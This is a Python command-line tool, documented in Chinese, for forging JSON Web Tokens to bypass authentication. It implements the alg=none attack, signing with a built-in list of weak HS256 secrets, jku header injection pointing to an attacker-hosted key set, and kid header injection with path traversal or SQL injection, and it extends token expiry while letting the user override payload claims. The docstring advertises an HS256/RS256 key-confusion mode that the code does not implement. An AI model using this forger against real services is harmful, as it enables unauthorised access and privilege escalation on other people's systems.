#!/usr/bin/env python3
"""JWT Forge Tool — JWT 伪造与攻击工具

支持的攻击:
  - none 算法: {"alg":"none"} 空签名绕过
  - HS256 弱密钥暴力: 用常见密钥列表尝试签名
  - HS256↔RS256 混淆: 用公钥签 HS256 token
  - jku 注入: 嵌入恶意 JWKS 端点 URL
  - kid 注入: SQLi/路径穿越 in kid header

用法:
  python jwt_forge.py --token TOKEN --attack none
  python jwt_forge.py --token TOKEN --attack hs256 --wordlist common
  python jwt_forge.py --token TOKEN --attack jku --jwks-url http://attacker/jwks.json
  python jwt_forge.py --token TOKEN --attack confuse --public-key-file pubkey.pem

输出: JSON {attack, forged_token, original_payload, notes}
"""

import argparse, base64, hashlib, hmac, json, sys, time


_COMMON_KEYS = [
    "secret", "key", "password", "admin", "test", "123456", "changeme",
    "jwt_secret", "SECRET_KEY", "JWT_SECRET", "your-256-bit-secret",
    "prod.key", "server.key", "app.secret", "supersecret",
    "cloudfunc", "CloudFunc", "serverless", "token", "api_key",
    "mysecretkey", "privatekey", "authkey", "session_secret",
    "secretkey", "secret_key", "application.secret", "spring.jwt.secret"
]


def decode_jwt(token: str) -> dict[str, any]:
    """解码 JWT（不验证签名）"""
    parts = token.split(".")
    if len(parts) < 2:
        return {"error": "invalid JWT format", "token": token}

    def decode_part(p: str) -> dict:
        p = p + "=" * (4 - len(p) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(p))
        except Exception:
            return {"raw": p}

    return {
        "header": decode_part(parts[0]),
        "payload": decode_part(parts[1]),
        "signature": parts[2] if len(parts) > 2 else "",
    }


def encode_jwt(header: dict, payload: dict, signature: str = "") -> str:
    """编码 JWT"""
    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    token = f"{h}.{p}"
    if signature:
        token += f".{signature}"
    return token


def attack_none(decoded: dict) -> dict:
    """none 算法攻击"""
    header = dict(decoded["header"])
    header["alg"] = "none"
    payload = dict(decoded["payload"])
    # Extend expiration
    if "exp" in payload:
        payload["exp"] = int(time.time()) + 3600
    token = encode_jwt(header, payload)
    return {
        "attack": "none",
        "forged_token": token,
        "original_payload": decoded["payload"],
        "notes": "Set alg=none, removed signature. Server must accept 'none' algorithm."
    }


def attack_hs256_brute(decoded: dict) -> dict:
    """HS256 弱密钥暴力"""
    header = dict(decoded["header"])
    header["alg"] = "HS256"
    payload = dict(decoded["payload"])
    if "exp" in payload:
        payload["exp"] = int(time.time()) + 3600

    msg = encode_jwt(header, payload).encode()
    # msg = header_b64 + "." + payload_b64 (before signature)
    parts = msg.decode().split(".")
    signing_input = f"{parts[0]}.{parts[1]}"

    found = []
    for key in _COMMON_KEYS:
        sig = base64.urlsafe_b64encode(
            hmac.new(key.encode(), signing_input.encode(), hashlib.sha256).digest()
        ).rstrip(b"=").decode()
        forged = f"{signing_input}.{sig}"
        found.append({"key": key, "token": forged[:60] + "..."})

    return {
        "attack": "hs256_brute",
        "keys_tested": len(_COMMON_KEYS),
        "candidates": found[:5],
        "notes": "Test each candidate against the target. Common keys: secret, key, password"
    }


def attack_jku(decoded: dict, jwks_url: str) -> dict:
    """jku 头部注入"""
    header = dict(decoded["header"])
    header["alg"] = "RS256"
    header["jku"] = jwks_url
    payload = dict(decoded["payload"])
    if "exp" in payload:
        payload["exp"] = int(time.time()) + 3600

    # Can't fully sign without the private key, but return the tampered header
    token = encode_jwt(header, payload)
    return {
        "attack": "jku",
        "forged_token": token,
        "original_payload": decoded["payload"],
        "jku_url": jwks_url,
        "notes": "Server fetches JWKS from jku URL to verify. Upload your JWKS there, sign with your key."
    }


def attack_kid_inject(decoded: dict, kid_payload: str) -> dict:
    """kid 头注入"""
    header = dict(decoded["header"])
    header["kid"] = kid_payload
    payload = dict(decoded["payload"])
    token = encode_jwt(header, payload)
    return {
        "attack": "kid_inject",
        "forged_token": token,
        "kid_payload": kid_payload,
        "notes": "SQLi/Path Traversal in kid field. E.g. '../../../../../dev/null'"
    }


def main():
    parser = argparse.ArgumentParser(description="JWT Forge Tool")
    parser.add_argument("--token", required=True, help="Original JWT token")
    parser.add_argument("--attack", required=True,
                        choices=["none", "hs256", "jku", "kid", "decode"],
                        help="Attack type")
    parser.add_argument("--jwks-url", default="http://attacker/jwks.json",
                        help="JWKS URL for jku attack")
    parser.add_argument("--kid-payload", default="../../dev/null",
                        help="Payload for kid injection")
    parser.add_argument("--payload-override", default=None,
                        help="JSON string to override JWT payload fields")
    args = parser.parse_args()

    decoded = decode_jwt(args.token)
    if "error" in decoded:
        print(json.dumps(decoded, indent=2))
        return

    if args.payload_override:
        try:
            override = json.loads(args.payload_override)
            decoded["payload"].update(override)
        except json.JSONDecodeError:
            pass

    if args.attack == "decode":
        result = {"attack": "decode", **decoded}
    elif args.attack == "none":
        result = attack_none(decoded)
    elif args.attack == "hs256":
        result = attack_hs256_brute(decoded)
    elif args.attack == "jku":
        result = attack_jku(decoded, args.jwks_url)
    elif args.attack == "kid":
        result = attack_kid_inject(decoded, args.kid_payload)

    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
